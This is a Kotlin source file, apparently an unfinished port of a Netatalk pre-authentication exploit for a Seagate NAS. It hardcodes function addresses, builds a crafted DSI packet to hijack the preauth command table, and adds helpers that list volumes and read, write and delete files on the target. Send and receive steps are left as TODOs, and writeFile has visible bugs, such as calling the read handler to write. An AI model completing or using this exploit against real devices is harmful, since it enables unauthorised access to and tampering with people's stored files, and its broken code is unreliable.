package me.smoothhacker.swampsploit.exploit

import java.net.*
import java.util.*
import kotlin.experimental.or

@OptIn(ExperimentalUnsignedTypes::class)
class Netatalk constructor(
    private val address: String,
    private val port: Int = 21,
    private val timeout: Int = 1000,
) {

    // This exploit was written against a Netatalk compiled for an
    // x86_64 Seagate NAS. The addresses below will need to be changed
    // for a different target.
    val preauthSwitchBase = ubyteArrayOf(96u, 182u, 99u, 0u, 0u, 0u, 0u, 0u) // 0x63b6a0
    val afpGetServerParams = ubyteArrayOf(96u, 182u, 66u, 0u, 0u, 0u, 0u, 0u) // 0x42b660
    val afpOpenVolume = ubyteArrayOf(176u, 184u, 66u, 0u, 0u, 0u, 0u, 0u)  // 42b8b0
    val afpEnumerateExt2 = ubyteArrayOf(144u, 151u, 65u, 0u, 0u, 0u, 0u, 0u) // 419790
    val afpOpenFork = ubyteArrayOf(208u, 41u, 66u, 0u, 0u, 0u, 0u, 0u) // 4229d0
    val afpReadExt = ubyteArrayOf(48u, 58u, 66u, 0u, 0u, 0u, 0u, 0u) // 423a30
    val afpCreateFile = ubyteArrayOf(16u, 207u, 65u, 0u, 0u, 0u, 0u, 0u) // 41cf10
    val afpWriteExt = ubyteArrayOf(176u, 63u, 66u, 0u, 0u, 0u, 0u, 0u) // 423fb0
    val afpDelete = ubyteArrayOf(32u, 6u, 66u, 0u, 0u, 0u, 0u, 0u) // 420620

    fun exploit(socket: Socket) {
        val data = UByteArray(42)
        data[1] = 4u
        data[3] = 1u
        data[11] = 26u // 0x1a
        data[16] = 1u
        data[17] = 24u // 0x18
        data[18] = 173u // 0xad
        data[19] = 170u // 0xaa
        data[20] = 170u // 0xaa
        data[21] = 186u // 0xba
        data[22] = 239u // 0xef
        data[23] = 190u // 0xbe
        data[24] = 173u // 0xad
        data[25] = 222u // 0xde
        data[26] = 254u // 0xfe
        data[27] = 202u // 0xca
        data[28] = 29u // 0x1d
        data[29] = 192u // 0xc0
        data[30] = 206u // 0xce
        data[31] = 250u // 0xfa
        data[32] = 237u // 0xed
        data[33] = 254u // 0xfe
        preauthSwitchBase.copyInto(data, 34)
        // TODO send data and receive
    }

    fun sendRequest(socket: Socket, requestId: UShort, address: UByteArray, params: UByteArray) {
        val data = UByteArray(160)
        data[1] = 2u // command
        data[2] = requestId.rotateRight(UByte.SIZE_BITS).toUByte()
        data[3] = requestId.toUByte()
        data[11] = 144u
        data[16] = 17u
        params.copyInto(data, 18)
        address.copyInto(data, 152)
        // TODO send data
    }

    fun parseDSI(payload: UByteArray, expectedReqId: Int): UByteArray {
        val flags = payload[0]
        val command = payload[1]
        val reqId = payload[2].toUShort().rotateLeft(UByte.SIZE_BITS)
            .or(payload[3].toUShort())
        val errorCode = payload[4].toUInt().rotateLeft(UByte.SIZE_BITS)
            .or(payload[5].toUInt()).rotateLeft(UByte.SIZE_BITS)
            .or(payload[6].toUInt()).rotateLeft(UByte.SIZE_BITS)
            .or(payload[7].toUInt())
        val length = payload[UByte.SIZE_BITS].toUInt().rotateLeft(UByte.SIZE_BITS)
            .or(payload[9].toUInt()).rotateLeft(UByte.SIZE_BITS)
            .or(payload[10].toUInt()).rotateLeft(UByte.SIZE_BITS)
            .or(payload[11].toUInt())
        val reserved = payload[12].toUInt().rotateLeft(UByte.SIZE_BITS)
            .or(payload[13].toUInt()).rotateLeft(UByte.SIZE_BITS)
            .or(payload[14].toUInt()).rotateLeft(UByte.SIZE_BITS)
            .or(payload[15].toUInt())

        if (!command.equals(8)) {
            if (!flags.equals(1) || !command.equals(2) || !reqId.equals(expectedReqId)) {
                // TODO
                // Bad DSI header
            }
            if (!errorCode.equals(0) && !errorCode.equals(4294962287)) {
                // TODO
                // Server responded with error code blah
            }
        }

        var afp_data = payload.copyOfRange(16, payload.size)
        if (!length.equals(afp_data.size)) {
            if (!command.equals(8)) {
                // TODO
                // Invalid length in DSI header
            } else {
                afp_data = parseDSI(afp_data.copyOfRange(length.toInt(), afp_data.size), expectedReqId)
            }
        }
        return afp_data
    }

    fun listVolumes(socket: Socket) {
        // TODO send 0u, 1u
        // TODO receive
        val response = ubyteArrayOf()
        var afpData = parseDSI(response, 1)
        val volumes = afpData[4]
        afpData = afpData.copyOfRange(5, afpData.size)
        for (i in 0 until volumes.toInt()) {
            // Not entirely sure about this area
            val strLen: Short = afpData[0].toShort().rotateLeft(UByte.SIZE_BITS).or(afpData[1].toShort())
            val name = afpData.copyOfRange(2, 2 + strLen.toInt())
            // TODO print name
            afpData = afpData.copyOfRange(2 + strLen.toInt(), afpData.size)
        }
    }

    fun openVolume(socket: Socket, requestId: UShort, params: UByteArray): UShort {
        sendRequest(socket, requestId, afpOpenVolume, params)
        // TODO receive
        val response = UByteArray(0)

        val afpData = parseDSI(response, 1)
        val bitmap: UShort = afpData[0].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[1].toUShort())
        val vid: UShort = afpData[2].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[3].toUShort())
        return vid
    }

    fun listVolumeContent(socket: Socket, name: UByteArray) {
        val params = UByteArray(3 + name.size)
        params[1] = 32u
        name.copyInto(params, 3)
        val vid = openVolume(socket, 1u, params)

        sendRequest(socket, 2u, afpEnumerateExt2, ubyteArrayOf(
            vid.rotateLeft(UByte.SIZE_BITS).toUByte(), vid.toUByte(),
            0u, 0u, 0u, 2u, 1u, 64u, 1u, 64u, 7u, 255u, 0u, 0u, 0u, 
            1u, 127u, 255u, 255u, 255u, 2u, 0u, 0u, 0u
        ))
        
        // TODO receive
        val response = UByteArray(0)
        
        var afpData = parseDSI(response, 2)
        val fBitmap: UShort = afpData[0].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[1].toUShort())
        val dBitmap: UShort = afpData[2].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[3].toUShort())
        val reqCount: UShort = afpData[4].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[5].toUShort())

        afpData = afpData.copyOfRange(6, afpData.size)
        for (i in 0 until reqCount.toInt()) {
            val length = afpData[0].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[1].toUShort())
            val isDir = afpData[2].equals(1)
            val fileId = afpData[6].toUInt().rotateLeft(UByte.SIZE_BITS)
                .or(afpData[7].toUInt()).rotateLeft(UByte.SIZE_BITS)
                .or(afpData[8].toUInt()).rotateLeft(UByte.SIZE_BITS)
                .or(afpData[9].toUInt()).rotateLeft(UByte.SIZE_BITS)
            val name = afpData.copyOfRange(11, 11 + afpData[10].toInt()).toString()
            if (isDir) {
                // TODO
            } else {
                // TODO
            }
            afpData = afpData.copyOfRange(length.toInt(), afpData.size)
        }
    }

    fun catFile(socket: Socket, volName: UByteArray, fileName: UByteArray) {
        var params = UByteArray(3 + volName.size)
        params[1] = 32u
        params[2] = volName.size.toUByte()
        volName.copyInto(params, 3)
        val vid = openVolume(socket, 1u, params)

        // open fork
        params = UByteArray(12 + fileName.size)
        params[0] = vid.rotateRight(UByte.SIZE_BITS).toUByte()
        params[1] = vid.toUByte()
        params[5] = 2u
        params[9] = 3u
        params[10] = 2u
        params[11] = fileName.size.toUByte()
        fileName.copyInto(params, 12)
        sendRequest(socket, 2u, afpOpenFork, params)
        // TODO receive
        var response = UByteArray(0)

        var afpData = parseDSI(response, 2)
        val fBitmap: UShort = afpData[0].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[1].toUShort())
        val forkId: UShort = afpData[2].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[3].toUShort())

        sendRequest(socket, 3u, afpReadExt, ubyteArrayOf(
            forkId.rotateLeft(UByte.SIZE_BITS).toUByte(), forkId.toUByte(),
            0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u, 3u, 0u
        ))
        // TODO receive
        response = UByteArray(0)

        afpData = parseDSI(response, 3)
    }

    fun writeFile(socket: Socket, volName: UByteArray, fileName: UByteArray, data: UByteArray) {
        // open the volume
        var params = UByteArray(3 + volName.size)
        params[1] = 32u
        params[2] = volName.size.toUByte()
        volName.copyInto(params, 3)
        val vid = openVolume(socket, 1u, params)

        // create the file
        params = UByteArray(8 + volName.size)
        params[0] = vid.rotateRight(UByte.SIZE_BITS).toUByte()
        params[1] = vid.toUByte()
        params[5] = 2u
        params[6] = 2u
        params[7] = fileName.size.toUByte()
        fileName.copyInto(params, 8)
        // TODO receive
        var response = UByteArray(0)
        var afpData = parseDSI(response, 2)

        if (afpData.isNotEmpty()) {
            // TODO receive
            response = UByteArray(0)
        }

        // open fork
        params = UByteArray(12 + fileName.size)
        params[0] = vid.rotateRight(UByte.SIZE_BITS).toUByte()
        params[1] = vid.toUByte()
        params[5] = 2u
        params[9] = 3u
        params[10] = 2u
        params[11] = fileName.size.toUByte()
        fileName.copyInto(params, 12)
        sendRequest(socket, 2u, afpOpenFork, params)
        // TODO receive
        response = UByteArray(0)

        afpData = parseDSI(response, 3)
        val fBitmap: UShort = afpData[0].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[1].toUShort())
        val forkId: UShort = afpData[2].toUShort().rotateLeft(UByte.SIZE_BITS).or(afpData[3].toUShort())

        // write
        val dataLength = data.size.toULong()
        params = UByteArray(12 + fileName.size)
        params = UByteArray(2)
        sendRequest(socket, 3u, afpReadExt, ubyteArrayOf(
            forkId.rotateLeft(UByte.SIZE_BITS).toUByte(), forkId.toUByte(),
            0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u,
            0u, 0u, 0u, 0u, // upper part of ULongLong
            dataLength.rotateRight(UByte.SIZE_BITS * 3).toUByte(),
            dataLength.rotateRight(UByte.SIZE_BITS * 2).toUByte(),
            dataLength.rotateRight(UByte.SIZE_BITS).toUByte(),
            dataLength.toUByte()
        ))

        // TODO receive
        response = UByteArray(0)
        afpData = parseDSI(response, 4)
    }

    fun deleteFile(socket: Socket, volName: UByteArray, fileName: UByteArray) {
        // open the volume
        var params = UByteArray(3 + volName.size)
        params[1] = 32u
        params[2] = volName.size.toUByte()
        volName.copyInto(params, 3)
        val vid = openVolume(socket, 1u, params)

        params = UByteArray(8 + fileName.size)
        params[0] = vid.rotateRight(UByte.SIZE_BITS).toUByte()
        params[1] = vid.toUByte()
        params[5] = 2u
        params[6] = 2u
        params[7] = fileName.size.toUByte()
        fileName.copyInto(params, 8)
        sendRequest(socket, 2u, afpDelete, params)

        // TODO receive
        val response = UByteArray(0)
        val afpData = parseDSI(response, 2)
    }
}
